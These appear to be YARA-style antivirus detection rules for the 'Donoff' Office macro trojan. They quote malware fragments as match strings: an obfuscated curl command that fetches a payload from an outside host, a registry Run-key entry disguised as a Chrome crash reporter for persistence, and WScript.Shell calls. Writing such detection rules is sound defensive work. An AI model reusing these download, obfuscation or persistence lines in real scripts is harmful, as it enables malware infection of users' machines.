
rule Trojan_O97M_Donoff_SM_MTB{
	meta:
		description = "Trojan:O97M/Donoff.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,09 00 09 00 05 00 00 "
		
	strings :
		$a_01_0 = {73 64 20 3d 20 43 68 72 28 64 66 20 2d 20 31 30 33 29 } //5 sd = Chr(df - 103)
		$a_01_1 = {73 64 67 66 64 73 20 63 73 64 61 20 62 66 67 6a 20 76 64 66 73 68 20 34 32 34 20 67 72 74 6a 75 79 20 76 66 64 73 6a 68 79 20 } //1 sdgfds csda bfgj vdfsh 424 grtjuy vfdsjhy 
		$a_01_2 = {57 53 43 72 69 70 74 2e 73 68 65 6c 6c } //1 WSCript.shell
		$a_01_3 = {2f 2f 2a 5b 40 75 6e 69 74 50 72 69 63 65 20 3e 20 32 30 5d } //1 //*[@unitPrice > 20]
		$a_01_4 = {73 61 66 64 20 22 22 } //1 safd ""
	condition:
		((#a_01_0  & 1)*5+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=9
 
}
rule Trojan_O97M_Donoff_SM_MTB_2{
	meta:
		description = "Trojan:O97M/Donoff.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {4e 4e 55 50 55 45 4a 55 57 55 2e 52 65 67 57 72 69 74 65 28 27 48 4b 43 55 5c 5c 53 6f 66 74 77 61 72 65 5c 5c 4d 69 63 72 6f 73 6f 66 74 5c 5c 57 69 6e 64 6f 77 73 5c 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 5c 52 75 6e 5c 5c 47 6f 6f 67 6c 65 20 43 68 72 6f 6d 65 20 43 72 61 73 68 20 52 65 70 6f 72 74 65 72 27 2c 20 61 69 6b 69 64 6f 28 29 20 2b 20 27 5c 5c 43 72 61 73 68 52 65 70 6f 72 74 2e 65 78 65 27 2c 20 27 52 45 47 5f 53 5a 27 29 3b } //1 NNUPUEJUWU.RegWrite('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Google Chrome Crash Reporter', aikido() + '\\CrashReport.exe', 'REG_SZ');
		$a_01_1 = {43 72 61 73 68 52 65 70 6f 72 74 2e 65 52 45 50 49 54 78 65 27 3b 20 73 32 66 69 6c 65 28 61 69 6b 69 64 6f 28 29 20 2b 20 27 5c 5c 27 20 2b 20 6b 69 6e 73 2e 72 65 70 6c 61 63 65 28 27 52 45 50 49 54 27 2c 27 27 29 2c } //1 CrashReport.eREPITxe'; s2file(aikido() + '\\' + kins.replace('REPIT',''),
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule Trojan_O97M_Donoff_SM_MTB_3{
	meta:
		description = "Trojan:O97M/Donoff.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {63 75 72 6c 25 43 6f 6d 6d 6f 6e 50 72 6f 67 72 61 6d 57 36 34 33 32 3a 7e 32 33 2c 31 25 2d 2d 73 69 6c 25 54 45 4d 50 3a 7e 2d 33 2c 31 25 6e 25 41 50 50 44 41 54 41 3a 7e 2d 31 30 2c 2d 39 25 20 68 74 74 70 25 43 6f 6d 6d 6f 6e 50 72 6f 67 72 61 6d 46 69 6c 65 73 28 78 38 36 29 3a 7e 31 35 2c 31 25 3a 2f 2f 74 76 2d 6d 25 41 50 50 44 41 54 41 3a 7e 2d 39 2c 2d 38 25 72 6b 65 74 2e 6f 6e 6c 69 6e 25 43 6f 6d 6d 6f 6e 50 72 6f 67 72 61 6d 46 69 6c 65 73 3a 7e 2d 31 35 2c 2d 31 34 25 2f 73 69 6d 70 25 54 45 4d 50 3a 7e 2d 36 2c 31 25 65 2e 25 54 45 4d 50 3a 7e 2d 31 36 2c 2d 31 35 25 6e 67 20 2d 2d 6f 75 74 70 75 74 20 22 22 25 6e 61 6d 65 78 25 22 22 20 2d 2d 73 73 6c 2d 6e 6f 2d 72 65 76 6f 6b 65 22 20 26 20 76 62 43 72 4c 66 } //1 curl%CommonProgramW6432:~23,1%--sil%TEMP:~-3,1%n%APPDATA:~-10,-9% http%CommonProgramFiles(x86):~15,1%://tv-m%APPDATA:~-9,-8%rket.onlin%CommonProgramFiles:~-15,-14%/simp%TEMP:~-6,1%e.%TEMP:~-16,-15%ng --output ""%namex%"" --ssl-no-revoke" & vbCrLf
		$a_01_1 = {43 72 65 61 74 65 54 65 78 74 46 69 6c 65 20 28 74 65 6d 70 70 61 74 68 20 26 20 22 5c 55 6a 64 55 68 73 62 73 6a 66 55 2e 74 78 74 22 29 } //1 CreateTextFile (temppath & "\UjdUhsbsjfU.txt")
		$a_01_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //1 CreateObject("Wscript.Shell")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}